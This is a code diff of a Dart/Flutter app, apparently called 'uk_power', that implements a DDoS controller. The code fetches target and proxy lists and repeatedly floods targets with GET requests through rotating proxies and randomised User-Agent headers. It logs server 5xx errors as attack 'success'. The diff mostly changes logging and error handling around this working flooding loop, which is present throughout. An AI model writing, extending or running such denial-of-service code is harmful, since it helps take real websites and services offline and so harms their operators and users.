@@ -1,15 +1,16 @@
 import 'dart:async';
 import 'dart:convert';
-import 'dart:developer' as dev;
+import 'dart:ffi';
 import 'dart:io';
+
+import 'package:flutter/foundation.dart';
 
 import 'package:dio/dio.dart';
 import 'package:dio/adapter.dart';
-
 import 'package:faker/faker.dart';
-import 'package:flutter/foundation.dart';
-import 'package:uk_power/constants.dart';
+import 'package:logger/logger.dart';
 
+import 'package:uk_power/constants.dart';
 import 'package:uk_power/ddos_info.dart';
 
 class Proxy {
@@ -43,7 +44,7 @@ class DDOSController {
       await Future.delayed(const Duration(seconds: 1));
       callback(await _getDirectTargets());
     } catch (ex) {
-      dev.log(ex.toString());
+      Logger().e(ex.toString());
       callback(
         DDOSInfo(
           status: DDOSStatus.error,
@@ -63,7 +64,7 @@ class DDOSController {
       try {
         body = response.data.toString();
       } catch (ex) {
-        dev.log(ex.toString());
+        Logger().e(ex.toString());
         return DDOSInfo(
           msg: invalidBodyError + ex.toString(),
           responseCode: 503,
@@ -89,7 +90,7 @@ class DDOSController {
         dateTime: DateTime.now(),
       );
     } catch (ex) {
-      dev.log(ex.toString());
+      Logger().e(ex.toString());
       return DDOSInfo(
         msg: tryAgainHosts + ex.toString(),
         responseCode: 503,
@@ -108,7 +109,7 @@ class DDOSController {
       try {
         body = response.data.toString();
       } catch (ex) {
-        dev.log(ex.toString());
+        Logger().e(ex.toString());
         return DDOSInfo(
           msg: invalidBodyError + ex.toString(),
           responseCode: 503,
@@ -130,7 +131,7 @@ class DDOSController {
         dateTime: DateTime.now(),
       );
     } catch (ex) {
-      dev.log(ex.toString());
+      Logger().e(ex.toString());
       return DDOSInfo(
         msg: tryAgainDirect + ex.toString(),
         responseCode: 503,
@@ -145,14 +146,12 @@ class DDOSController {
 
     try {
       Response response = await dio.getUri(Uri.parse(proxySource));
-      String body = "";
       Map<String, dynamic> jsonData = {};
 
       try {
-        body = response.data.toString();
-        jsonData = jsonDecode(body);
+        jsonData = response.data;
       } catch (ex) {
-        dev.log(ex.toString());
+        Logger().e(ex.toString());
       }
 
       var data = jsonData['data'];
@@ -167,7 +166,7 @@ class DDOSController {
         );
       }
     } catch (ex) {
-      dev.log(ex.toString());
+      Logger().e(ex.toString());
     }
 
     return proxies;
@@ -204,7 +203,7 @@ class DDOSController {
   Future<void> dance(void Function(DDOSInfo) callback) async {
     // create headers
     Map<String, String> headers = {
-      'Content-Type': 'application/json',
+      'Content-Type': 'application/json; text/html; charset=UTF-8',
       'cf-visitor': 'https',
       'User-Agent': faker.internet.userAgent(),
       'Connection': 'keep-alive',
@@ -246,9 +245,9 @@ class DDOSController {
 
         try {
           body = response.data.toString();
-          jsonData = jsonDecode(body);
+          jsonData = jsonDecode(utf8.decode(utf8.encode(body)));
         } catch (ex) {
-          dev.log(ex.toString());
+          Logger().e(ex.toString());
           callback(
             DDOSInfo(
               msg: invalidBodyError + ex.toString(),
@@ -279,7 +278,7 @@ class DDOSController {
             proxies,
           );
         } catch (ex) {
-          dev.log(ex.toString());
+          Logger().e(ex.toString());
           callback(
             DDOSInfo(
               msg: ex.toString(),
@@ -292,7 +291,7 @@ class DDOSController {
           continue;
         }
       } catch (ex) {
-        dev.log(ex.toString());
+        Logger().e(ex.toString());
         callback(
           DDOSInfo(
             msg: hostsKW + ex.toString(),
@@ -330,7 +329,7 @@ class DDOSController {
           proxies,
         );
       } catch (ex) {
-        dev.log(ex.toString());
+        Logger().e(ex.toString());
         callback(
           DDOSInfo(
             msg: directKW + ex.toString(),
@@ -351,114 +350,149 @@ class DDOSController {
     List<Proxy> proxies,
   ) async {
     dio = Dio();
-
-    Response response = await dio
-        .getUri(
-          target,
-          options: Options(
-            headers: headers,
-          ),
-        )
-        .timeout(
-          timeout,
-          onTimeout: () => throw TimeoutException(
-            timeoutError.replaceAll(
-              "COUNT",
-              timeout.inSeconds.toString(),
+    Response? response;
+    try {
+      response = await dio
+          .getUri(
+            target,
+            options: Options(
+              headers: headers,
             ),
-          ),
-        );
+          )
+          .timeout(
+            timeout,
+            onTimeout: () => throw TimeoutException(
+              timeoutError.replaceAll(
+                "COUNT",
+                timeout.inSeconds.toString(),
+              ),
+            ),
+          );
 
-    // lets use proxies
-    if (response.statusCode! >= 302 && response.statusCode! >= 200) {
-      for (Proxy proxy in proxies) {
-        // update headers
-        headers['User-Agent'] = faker.internet.userAgent();
-        // apply proxy
-        (dio.httpClientAdapter as DefaultHttpClientAdapter).onHttpClientCreate =
-            (client) {
-          client.findProxy = (uri) {
-            return proxy.toString();
+      // lets use proxies
+      if (response.statusCode! >= 302 && response.statusCode! >= 200) {
+        for (Proxy proxy in proxies) {
+          // update headers
+          headers['User-Agent'] = faker.internet.userAgent();
+          // apply proxy
+          (dio.httpClientAdapter as DefaultHttpClientAdapter)
+              .onHttpClientCreate = (client) {
+            client.findProxy = (uri) {
+              return proxy.toString();
+            };
+            return HttpClient();
           };
-          return HttpClient();
-        };
 
-        dio.options.headers = headers;
-        var dioResponse = await dio
-            .getUri(
-              target,
-            )
-            .timeout(
-              timeout,
-              onTimeout: () => throw TimeoutException(
-                timeoutProxyError.replaceAll(
-                  "COUNT",
-                  timeout.inSeconds.toString(),
-                ),
-              ),
-            );
-
-        if (dioResponse.statusCode! >= 200 && dioResponse.statusCode! <= 302) {
-          for (int i = 0; i < maxIterations; ++i) {
-            dioResponse = await dio
-                .getUri(
-                  target,
-                )
-                .timeout(
-                  timeout,
-                  onTimeout: () => throw TimeoutException(
-                    timeoutProxyError.replaceAll(
-                      "COUNT",
-                      timeout.inSeconds.toString(),
-                    ),
+          dio.options.headers = headers;
+          var dioResponse = await dio
+              .getUri(
+                target,
+              )
+              .timeout(
+                timeout,
+                onTimeout: () => throw TimeoutException(
+                  timeoutProxyError.replaceAll(
+                    "COUNT",
+                    timeout.inSeconds.toString(),
                   ),
-                );
+                ),
+              );
 
-            callback(
-              DDOSInfo(
-                msg: successProxy,
-                target: target,
-                dateTime: DateTime.now(),
-                responseCode: dioResponse.statusCode ?? -1,
-                status: DDOSStatus.attack,
-              ),
-            );
+          if (dioResponse.statusCode! >= 200 &&
+              dioResponse.statusCode! <= 302) {
+            for (int i = 0; i < maxIterations; ++i) {
+              dioResponse = await dio
+                  .getUri(
+                    target,
+                  )
+                  .timeout(
+                    timeout,
+                    onTimeout: () => throw TimeoutException(
+                      timeoutProxyError.replaceAll(
+                        "COUNT",
+                        timeout.inSeconds.toString(),
+                      ),
+                    ),
+                  );
+
+              callback(
+                DDOSInfo(
+                  msg: successProxy,
+                  target: target,
+                  dateTime: DateTime.now(),
+                  responseCode: dioResponse.statusCode ?? -1,
+                  status: DDOSStatus.attack,
+                ),
+              );
+            }
           }
         }
       }
-    }
-    // lets dance
-    else {
-      for (int i = 0; i < maxIterations; ++i) {
-        // update headers
-        headers['User-Agent'] = faker.internet.userAgent();
-        response = await dio
-            .getUri(
-              target,
-              options: Options(
-                headers: headers,
-              ),
-            )
-            .timeout(
-              timeout,
-              onTimeout: () => throw TimeoutException(
-                timeoutError.replaceAll(
-                  "COUNT",
-                  timeout.inSeconds.toString(),
+      // lets dance
+      else {
+        for (int i = 0; i < maxIterations; ++i) {
+          // update headers
+          headers['User-Agent'] = faker.internet.userAgent();
+          response = await dio
+              .getUri(
+                target,
+                options: Options(
+                  headers: headers,
                 ),
-              ),
-            );
+              )
+              .timeout(
+                timeout,
+                onTimeout: () => throw TimeoutException(
+                  timeoutError.replaceAll(
+                    "COUNT",
+                    timeout.inSeconds.toString(),
+                  ),
+                ),
+              );
 
-        callback(
-          DDOSInfo(
-            msg: success,
-            target: target,
-            dateTime: DateTime.now(),
-            responseCode: response.statusCode!,
-            status: DDOSStatus.attack,
-          ),
-        );
+          callback(
+            DDOSInfo(
+              msg: success,
+              target: target,
+              dateTime: DateTime.now(),
+              responseCode: response.statusCode!,
+              status: DDOSStatus.attack,
+            ),
+          );
+        }
       }
+    } catch (ex) {
+      Logger().e(ex.toString());
+      DDOSStatus status = DDOSStatus.error;
+
+      if (ex is DioError) {
+        String exStr = ex.message;
+
+        if (exStr.contains("Http status error")) {
+          String temp = exStr
+              .replaceRange(0, exStr.indexOf("[") + 1, "")
+              .replaceAll("]", "")
+              .trim();
+
+          int code = int.tryParse(temp) ?? 0;
+
+          if (code >= 500) {
+            status = DDOSStatus.success;
+          } else if (code >= 400) {
+            status = DDOSStatus.attack;
+          }
+        }
+      }
+
+      callback(
+        DDOSInfo(
+          msg: ex.toString(),
+          target: target,
+          dateTime: DateTime.now(),
+          responseCode: response?.statusCode ?? -1,
+          status: status,
+        ),
+      );
     }
   }
 }
